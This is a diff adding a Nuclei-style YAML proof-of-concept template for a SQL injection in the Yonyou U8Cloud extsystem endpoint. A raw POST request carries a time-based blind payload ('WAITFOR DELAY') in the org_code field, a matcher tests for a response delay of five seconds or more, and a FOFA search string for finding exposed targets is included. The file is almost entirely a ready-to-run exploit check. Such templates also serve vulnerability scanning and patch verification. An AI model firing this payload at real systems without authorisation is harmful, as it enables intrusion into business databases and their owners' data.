@@ -1,0 +1,22 @@
+id: poc-hqwccigppnrg2i9f
+info:
+  name: 用友U8Cloud extsystem存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hqwccigppnrg2i9f
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hqwccigppnrg2i9f
+    fofa: title=="U8C"
+http:
+- raw:
+  - "POST /u8cloud/extsystem/dst/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \"exbilltype\": \"rm_gatherdailyreport\",\n  \"bill\": [{\n    \"data\": {\n      \"dept_code\": \"hello\",\n      \"org_code\": \"' ) WAITFOR DELAY '0:0:5' -- \",\n      \"customer_code\": \"test\",\n      \"vouchdate\": \"2026-07-11\",\n      \"dwbm\": \"1001\",\n      \"details\": [{\"payment_code\": \"hello\", \"money\": \"100\"}]\n    }\n  }]\n}"
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
